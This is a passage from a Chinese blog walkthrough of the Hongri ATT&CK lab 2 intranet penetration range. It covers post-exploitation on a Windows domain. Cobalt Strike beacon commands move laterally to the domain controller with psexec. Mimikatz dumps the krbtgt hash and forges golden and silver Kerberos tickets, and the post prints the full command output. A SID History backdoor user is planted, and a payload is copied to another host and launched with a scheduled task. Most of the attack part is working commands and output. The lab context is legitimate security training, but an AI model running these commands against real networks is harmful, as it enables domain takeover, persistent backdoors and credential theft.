+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421184339598.png" alt="image-20230421184339598"></p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421184435737.png" alt="image-20230421184435737"></p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421184937914.png" alt="image-20230421184937914"></p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421185030453.png" alt="image-20230421185030453"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">beacon&gt; make_token DE1AY\Administrator 1qaz@WSX</span><br><span class="line">[*] Tasked beacon to create a token for DE1AY\Administrator</span><br><span class="line">beacon&gt; jump psexec DC SMB</span><br><span class="line">[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_a9) on DC via Service Control Manager (\\DC\ADMIN$\9ca293a.exe)</span><br><span class="line">[+] host called home, sent: 287632 bytes</span><br><span class="line">[+] Impersonated NT AUTHORITY\SYSTEM</span><br><span class="line">[+] received output:</span><br><span class="line">Started service 9ca293a on DC</span><br><span class="line">[+] established link to child beacon: 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<p>成功上线</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421185201044.png" alt="image-20230421185201044"></p>
+<h1 id="后渗透权限维持"><a href="#后渗透权限维持" class="headerlink" title="后渗透权限维持"></a>后渗透权限维持</h1><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><blockquote>
+<p>所需条件:</p>
+<p>1、域名称</p>
+<p>2、域的SID值(用户的sid值去掉最后一个杠的数字就是域sid值)</p>
+<p>3、域的KRBTGT账号的HASH</p>
+<p>4、伪造任意用户名</p>
+<p>（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）</p>
+<p>黄金票据有TGT加密有效期通常为 10 小时</p>
+</blockquote>
+<p>获取域的KRBTGT账户NTLM密码哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">//82dfc71b72a11ef37d663047bc2088fb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421195610226.png" alt="image-20230421195610226"></p>
+<p>域的SID值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br><span class="line"></span><br><span class="line">//S-1-5-21-2756371121-2868759905-3853650604-1001</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421200245801.png" alt="image-20230421200245801"></p>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421200449928.png" alt="image-20230421200449928"></p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421200558617.png" alt="image-20230421200558617"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:de1ay /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /endin:480 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421200631793.png" alt="image-20230421200631793"></p>
+<p>创建票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:de1ay /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; mimikatz kerberos::golden /user:de1ay /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi</span><br><span class="line">[*] Tasked beacon to run mimikatz&#x27;s kerberos::golden /user:de1ay /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi command</span><br><span class="line">[+] host called home, sent: 787058 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">User      : de1ay</span><br><span class="line">Domain    : de1ay.com (DE1AY)</span><br><span class="line">SID       : S-1-5-21-2756371121-2868759905-3853650604</span><br><span class="line">User Id   : 500</span><br><span class="line">Groups Id : *513 512 520 518 519 </span><br><span class="line">ServiceKey: 82dfc71b72a11ef37d663047bc2088fb - rc4_hmac_nt      </span><br><span class="line">Lifetime  : 2023/4/21 21:54:38 ; 2033/4/18 21:54:38 ; 2033/4/18 21:54:38</span><br><span class="line">-&gt; Ticket : ticket.kirbi</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Final Ticket Saved to file !</span><br><span class="line"></span><br><span class="line">beacon&gt; mimikatz kerberos::ptt ticket.kirbi</span><br><span class="line">[*] Tasked beacon to run mimikatz&#x27;s kerberos::ptt ticket.kirbi command</span><br><span class="line">[+] host called home, sent: 787055 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">* File: &#x27;ticket.kirbi&#x27;: OK</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz kerberos::list          //查看当前机器凭证</span><br><span class="line">mimikatz kerberos::ptt 票据文件   //将票据注入到内存中</span><br></pre></td></tr></table></figure>
+
+
+
+<p>模拟下域控会话被清除,依然可以使用黄金票据提权</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230422112933563.png" alt="image-20230422112933563"></p>
+<p>可正常访问域控C盘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\10.10.10.10\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SID-History域后门"><a href="#SID-History域后门" class="headerlink" title="SID History域后门"></a>SID History域后门</h2><blockquote>
+<p>SID History可以防止用户迁移进入不同的域后权限发生改变,原理是如果迁移后用户SID改变了系统会将其原来的SID添加到迁移以后的用户SID History属性中,使其依然可以访问原来的资源,可以使用mimikatz把SID History属性添加到任意用户SID History属性,这样在获取域管理员权限后可以实现持久化</p>
+</blockquote>
+<p>域控制器上新建一个恶意用户whoami</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user whoami Liu78963 /add</span><br></pre></td></tr></table></figure>
+
+<p>shellcode_inject启动mimikatz,将域管理员Administrator的SID添加到恶意域用户whoami的SID History属性中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch    #修复NTDS服务,可以使高权限SID注入到地权限用户的SID History属性</span><br><span class="line">sid::add /sam:whoami /new:Administrator   //将Administrator的SID添加到whoami的SID History属性中</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/20210328174752670.png" alt="img"></p>
+<p>然后用powershell验证一下whoami的SID History</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br><span class="line">powershell_shell</span><br><span class="line">Import-Module activedirectory</span><br><span class="line">Get-ADUser whoami -Properties sidhistory</span><br><span class="line">Get-ADUser administrator -Properties sidhistory</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/20210328174806551.png" alt="img"></p>
+<p>这样whoami就有了administrator域管权限,并且可以使用该用户登录域控</p>
+<h2 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h2><p>web给pc创建一个映射</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use X: \\pc\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230422102135296.png" alt="image-20230422102135296"></p>
+<p>kali远程桌面交互式命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Load Open3389</span><br><span class="line">Default Port is 3389 (0xd3d)</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span><br><span class="line">    PortNumber    REG_DWORD    0xd3d</span><br><span class="line">操作成功完成</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.111.80:3389</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230422102851130.png" alt="image-20230422102851130"></p>
+<p>然后传马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\mssql\big.exe \\pc\c$</span><br></pre></td></tr></table></figure>
+
+<p>创建计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\pc 10:39:00 cmd.exe /c &quot;start C:\\big.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230422103808639.png" alt="image-20230422103808639"></p>
+<p>成功上线</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230422104044882.png" alt="image-20230422104044882"></p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230422104717503.png" alt="image-20230422104717503"></p>
+<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><blockquote>
+<p>所需条件:</p>
+<p>1、域名称</p>
+<p>2、域的SID值(用户的sid值去掉最后一个杠的数字就是域sid值)</p>
+<p>3、服务账号的NTML HASH </p>
+<p>4、伪造的用户名</p>
+<p>5、可利用的服务</p>
+<p>白银票据由TGS加密通常只有几分钟生效时间</p>
+</blockquote>
+<p>获取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>这里我们伪造<code>cifs</code>服务,这里应该是拿DC$的</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230422120455234.png" alt="image-20230422120455234"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /target:DC.de1ay.com /service:cifs /rc4:9c9b02e33a331dce48e161488db8394c /user:test /ticket:silver.kirb</span><br><span class="line"></span><br><span class="line">登录域内普通用户,先清空凭据在将白银票据导入内存中</span><br><span class="line">kerberos::purgekerberos::ptt 生成票据位置</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/domain：域名</span><br><span class="line"></span><br><span class="line">/sid：域sid</span><br><span class="line"></span><br><span class="line">/target：目标服务器主机名</span><br><span class="line"></span><br><span class="line">/service：服务类型</span><br><span class="line"></span><br><span class="line">/rc4：目标主机NTLM Hash</span><br><span class="line"></span><br><span class="line">/user：随意输入的伪造名称</span><br><span class="line"></span><br><span class="line">/ticket：生成的票据文件名称</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421204419144.png" alt="image-20230421204419144"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\DC\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230422122750995.png" alt="image-20230422122750995"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz kerberos::list          //查看当前机器凭证</span><br><span class="line">mimikatz kerberos::ptt 票据文件  //将票据注入到内存中</span><br></pre></td></tr></table></figure>
+
+<p>也可以用exe,直接用cs要保存好凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; hash.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><a target="_blank" rel="noopener" href="https://evalexp.top/p/22116/#%E5%B0%9D%E8%AF%95PTH%E6%8B%BFPC">红日ATT&amp;CK之二 | 青 叶 (evalexp.top)</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://aaanz.github.io">anz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://aaanz.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/">https://aaanz.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://aaanz.github.io" target="_blank">anz</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/web/D3%E5%A4%8D%E7%8E%B0/"><img class="prev-cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">D3复现</div></div></a></div><div class="next-post pull-right"><a href="/ctfshow/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"><img class="next-cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">权限维持</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSSQL%E6%8F%90%E6%9D%83/" title="MSSQL&amp;提权"><img class="cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-09</div><div class="title">MSSQL&amp;提权</div></div></a></div><div><a href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/" title="内网基础"><img class="cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-10</div><div class="title">内网基础</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/75899c342847e73b.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">anz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aaanz"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to anz's blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%B0%E8%9D%8Ewebshell"><span class="toc-number">2.1.</span> <span class="toc-text">冰蝎webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf-%E6%8B%BFshell"><span class="toc-number">2.2.</span> <span class="toc-text">msf 拿shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">进程迁移提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text">令牌窃取提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%AC%E5%8F%91cs%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.</span> <span class="toc-text">转发cs提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.4.</span> <span class="toc-text">横向移动</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.</span> <span class="toc-text">后渗透权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.1.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SID-History%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="toc-number">4.2.</span> <span class="toc-text">SID History域后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PC"><span class="toc-number">4.3.</span> <span class="toc-text">PC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.4.</span> <span class="toc-text">白银票据</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/web/miniL/" title="MiniL CTF"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MiniL CTF"/></a><div class="content"><a class="title" href="/web/miniL/" title="MiniL CTF">MiniL CTF</a><time datetime="2023-05-10T00:32:27.529Z" title="发表于 2023-05-10 08:32:27">2023-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/web/D3%E5%A4%8D%E7%8E%B0/" title="D3复现"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="D3复现"/></a><div class="content"><a class="title" href="/web/D3%E5%A4%8D%E7%8E%B0/" title="D3复现">D3复现</a><time datetime="2023-05-03T08:27:47.715Z" title="发表于 2023-05-03 16:27:47">2023-05-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/" title="红日二"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日二"/></a><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/" title="红日二">红日二</a><time datetime="2023-04-20T07:14:49.281Z" title="发表于 2023-04-20 15:14:49">2023-04-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ctfshow/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="权限维持"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="权限维持"/></a><div class="content"><a class="title" href="/ctfshow/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="权限维持">权限维持</a><time datetime="2023-04-12T11:52:44.895Z" title="发表于 2023-04-12 19:52:44">2023-04-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Docker/docker%E5%AD%A6%E4%B9%A0/" title="Docker学习"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker学习"/></a><div class="content"><a class="title" href="/Docker/docker%E5%AD%A6%E4%B9%A0/" title="Docker学习">Docker学习</a><time datetime="2023-04-09T16:38:36.000Z" title="发表于 2023-04-10 00:38:36">2023-04-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By anz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
